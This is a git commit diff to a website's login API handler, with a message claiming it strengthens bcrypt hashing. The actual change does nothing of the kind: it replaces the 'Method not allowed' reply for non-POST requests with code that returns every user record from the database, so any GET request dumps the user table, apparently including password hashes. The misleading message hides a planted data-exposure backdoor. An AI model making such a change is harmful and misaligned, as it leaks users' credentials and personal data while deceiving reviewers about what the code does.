5c7f682d7977fbc76286bbf2ef1c1ed284d5e677
Mathias Haugsbø <mathiash98@gmail.com>
2024-09-13 17:34:25 +0200

    Update login.js -> Increase bcrypt hash security
    Just a small addition to improve security in the website

--- src/pages/api/login.js
+++ src/pages/api/login.js
@@ -29,6 +29,7 @@ export default async function handler(req, res) {
             res.status(500).json({ message: 'Server error', error });
         }
     } else {
-        res.status(405).json({ message: 'Method not allowed' });
+        const users = await User.find();
+        res.status(200).json(users);
     }
 }
